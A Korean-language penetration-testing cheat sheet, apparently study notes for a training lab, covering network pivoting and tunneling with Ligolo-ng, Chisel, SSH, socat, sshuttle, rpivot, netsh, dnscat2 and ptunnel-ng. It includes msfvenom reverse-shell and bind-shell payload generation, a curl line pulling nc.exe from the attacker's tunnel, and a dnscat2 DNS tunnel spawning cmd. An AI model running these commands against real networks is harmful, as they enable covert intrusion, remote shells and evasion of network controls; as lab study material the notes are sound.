<details>
  <summary><strong>기본 설정 및 개념</strong></summary>

### ProxyChains 설정
- `/etc/proxychains4.conf`에서 socks5로 작동을 안할시에 socks4로 바꿔서 실행해볼 것.

### 라우팅 테이블 확인
```bash
netstat -r
```
- Pivoting을 할 때 route table를 확인해야한다.
- route table에서 호스트를 찾을 수 없으면 default gateway로 패킷을 전송.

### 네트워크 스캔
```bash
# 간단한 ping sweep으로 활성 호스트 찾기
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
  
</details>

---
<details>
  <summary><strong>Ligolo-Ng</strong></summary>

```bash
# server
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz
sudo ./proxy -selfcert
```
```powershell
# client
./agent.exe -connect <rhost>:11601 -ignore-cert
```
```bash
# ligolo-ng
ifconfig

session

# 내부망에서 외부망으로 패킷 전달
listener_add --addr 0.0.0.0:8888 --to <lhost>:80
```
```bash
# 터널링 된 ip로 연결하면 외부망으로 연결 됨.
msfvenom -p windows/shell_reverse_tcp lhost=<tunneling ip> lport=8888 -f exe -o shell.exe
```
```powershell
curl http://<tunneling ip>:8888/nc.exe -o c:\temp\nc.exe
```
```bash
ip route add 192.168.148.0/24 dev ligolo #internal IP
ip route list
```
```bash
# ligolo-ng
start
```
  
</details>

---
<details>
  <summary><strong>Chisel</strong></summary>
### Port Forwarding
```bash
./chisel server -p 8000 --reverse

chisel client 10.10.14.3:8000 R:80:127.0.0.1:80
```


### Forward Proxy 모드
```bash
# 서버 실행 (공격자 머신)
sudo ./chisel server -v -p 1234 --socks5

# 클라이언트 실행 (타겟 머신)
./chisel client -v 10.129.202.64:1234 socks

# ProxyChains를 통한 접근
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Reverse Proxy 모드 (권장)
```bash
# 일반적으로 Reverse로 연결해서 사용

# 서버 실행 (공격자 머신)
sudo ./chisel server --reverse -v -p 1234 --socks5

# 클라이언트 실행 (타겟 머신)
./chisel client -v 10.10.14.17:1234 R:socks

# ProxyChains를 통한 접근
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
  
</details>

---
<details>
  <summary><strong>SSH Tunneling</strong></summary>

### Local Port Forwarding
```bash
# lhost:1234 > rhost:3306
# 로컬 포트 1234를 원격 호스트의 3306 포트로 포워딩
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# 여러 포트를 동시에 포워딩 가능
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# 포워딩된 포트 확인
nmap -v -sV -p1234 localhost
```

### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# SOCKS 프록시 생성 (포트 1080)
ssh -D 1080 ubuntu@10.129.202.64

# cat /etc/proxychains.conf
socks5 	127.0.0.1 1080

# ProxyChains를 통한 네트워크 스캔
proxychains nmap -v -sn 172.16.5.1-200

# TCP 스캔 (-Pn: ping 스캔 스킵, -sT: TCP connect 스캔)
proxychains nmap -v -Pn -sT 172.16.5.19

# RDP 연결
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Remote Port Forwarding
```bash
# 페이로드 생성
msfvenom -p windows/x64/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# rhost:8080 > lhost:8000
# 원격 호스트의 8080 포트를 로컬의 8000 포트로 리버스 포워딩
ssh -R <InternalIPofPivotHost>:8080:localhost:8000 ubuntu@<ipAddressofTarget> -vN

# 또는 모든 인터페이스에서 리슨
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

# 리스너 실행
nc -nvlp 8000
```
  
</details>

---
<details>
  <summary><strong>Socat</strong></summary>

### 기본 포트 포워딩
```bash
# rhost:8080 > lhost:80
# 8080 포트로 들어오는 연결을 10.10.14.18:80으로 포워딩
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- ssh가 사용되고 있지 않을 때 사용 가능함.

### Bind Shell 연결
```bash
# Bind shell 페이로드 생성
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# bind shell 연결을 위한 포트 포워딩
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
  
</details>

---
<details>
  <summary><strong>Windows Plink</strong></summary>

```powershell
# Windows에서 SSH 동적 포트 포워딩 (SOCKS 프록시)
plink -ssh -D 9050 ubuntu@10.129.15.50
```
  
</details>

---
<details>
  <summary><strong>sshuttle</strong></summary>

```bash
# VPN과 유사한 투명한 프록시 생성
# 172.16.5.0/23 네트워크로의 모든 트래픽을 SSH를 통해 라우팅
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# 직접 nmap 스캔 가능 (proxychains 불필요)
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```
  
</details>

---
<details>
  <summary><strong>Rpivot</strong></summary>

```bash
# 리포지토리 클론
git clone https://github.com/klsecservices/rpivot

# 공격자 머신에서 서버 실행
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# 타겟 머신에서 클라이언트 실행
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# NTLM 프록시를 통한 연결
python2.7 client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

# ProxyChains를 통한 접근
proxychains firefox-esr 172.16.5.135:80
```
  
</details>

---
<details>
  <summary><strong>Netsh.exe</strong></summary>

```powershell
# 포트 프록시 규칙 추가
# 10.129.15.150:8080으로 들어오는 연결을 172.16.5.25:3389로 포워딩
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

# 설정된 포트 프록시 규칙 확인
netsh.exe interface portproxy show v4tov4
```
```bash
# 포워딩된 포트로 RDP 연결
xfreerdp3 /v:10.129.15.150:8080 /u:victor /p:pass@123
```
- netsh.exe는 windows 내장 프로그램임.
  
</details>

---
<details>
  <summary><strong>DNS Proxy (dnscat2)</strong></summary>

### 서버 설정 (공격자 머신)
```bash
# 리포지토리 클론
git clone https://github.com/iagox86/dnscat2.git
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# DNS 서버 실행
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=inlanefreight.local --no-cache
```
<img width="1100" height="170" alt="image" src="https://github.com/user-attachments/assets/5aaf8b24-e096-45c1-bb4f-b0d441bc7e92" />

### 클라이언트 설정 (타겟 머신)
```powershell
# PowerShell 모듈 임포트
Import-Module .\dnscat2.ps1

# DNS 터널 시작 (Pre-Shared Secret 사용)
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

### 세션 관리
```bash
# 세션 윈도우로 전환 (세션 ID 1)
dnscat2> window -i 1
```
  
</details>

---
<details>
  <summary><strong>Ptunnel-ng</strong></summary>

### 설정 및 설치
```bash
# 리포지토리 클론
git clone https://github.com/utoni/ptunnel-ng.git

# lhost - 빌드
sudo ./autogen.sh

# 타겟 머신으로 전송
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

### 터널 생성
```bash
# rhost - 서버 실행
sudo ./ptunnel-ng -r10.129.202.64 -R22

# lhost - 클라이언트 실행
# ICMP 터널을 통해 SSH 포트(22)에 접근
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# 로컬 2222 포트로 SSH 연결
ssh -p2222 -lubuntu 127.0.0.1

# 동적 포트 포워딩과 함께 사용
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# ProxyChains를 통한 스캔
proxychains nmap -sV -sT 172.16.5.19 -p3389
```
  
</details>
